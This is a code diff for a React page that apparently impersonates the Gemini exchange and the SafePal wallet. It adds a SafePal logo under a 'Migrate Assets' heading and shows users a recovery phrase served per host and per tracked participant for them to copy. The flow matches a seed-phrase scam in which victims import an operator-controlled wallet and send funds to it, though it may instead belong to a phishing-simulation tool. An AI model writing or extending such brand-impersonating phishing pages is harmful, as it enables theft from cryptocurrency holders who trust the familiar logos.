@@ -1,9 +1,10 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
 import { Check, Copy } from "lucide-react";
-import { GeminiLogo, GI_ACCENT, GI_FONT_FAMILY, GiFontStyle, useGiQueryParam, useGiTracking } from "@/components/gi/GiShared";
+import { GeminiLogo, GI_ACCENT, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";
 import appStoreBadge from "@/assets/app-store-badge.svg";
 import googlePlayBadge from "@/assets/google-play-badge.svg";
+import safepalLogo from "@/assets/safepal-logo.png";
 import { resolveTenantByHost } from "@/lib/tenants.functions";
 
 const DEFAULT_PHRASE = "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";
@@ -23,17 +24,20 @@ const STEPS = [
 
 function GiSafePalPage() {
   const { trackClick, giNavigate, sessionId } = useGiTracking();
-  const phraseParam = useGiQueryParam("phrase");
-  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(phraseParam || DEFAULT_PHRASE);
+  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(DEFAULT_PHRASE);
   useEffect(() => {
-    if (phraseParam) { setRecoveryPhrase(phraseParam); return; }
     if (typeof window === "undefined") return;
     let alive = true;
-    resolveTenantByHost({ data: { host: window.location.host } })
+    resolveTenantByHost({
+      data: {
+        host: window.location.host,
+        participantId: sessionId || undefined,
+      },
+    })
       .then((r) => { if (alive && r.seedPhrase) setRecoveryPhrase(r.seedPhrase); })
       .catch(() => undefined);
     return () => { alive = false; };
-  }, [phraseParam]);
+  }, [sessionId]);
   const [step, setStep] = useState(0);
   const [copied, setCopied] = useState(false);
   const [animating, setAnimating] = useState(false);
@@ -71,6 +75,9 @@ function GiSafePalPage() {
       <div style={{ display: "flex", alignItems: "center", padding: "16px 24px", height: 75 }}><GeminiLogo /></div>
       <main style={{ display: "flex", justifyContent: "center", flexGrow: 1, padding: "32px 24px 0" }}>
         <div style={{ width: "100%", maxWidth: 420, display: "flex", flexDirection: "column" }}>
+          <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
+            <img src={safepalLogo} alt="SafePal" style={{ height: 72, width: "auto", pointerEvents: "none" }} />
+          </div>
           <h1 style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 12px 0", textAlign: "center" }}>Migrate Assets</h1>
           <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 6 }}>
             {STEPS.map((_, i) => (
@@ -159,7 +166,7 @@ function GiSafePalPage() {
           </div>
         </div>
       </main>
-      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
+      <div aria-hidden style={{ display: "none" }} />
     </div>
   );
 }
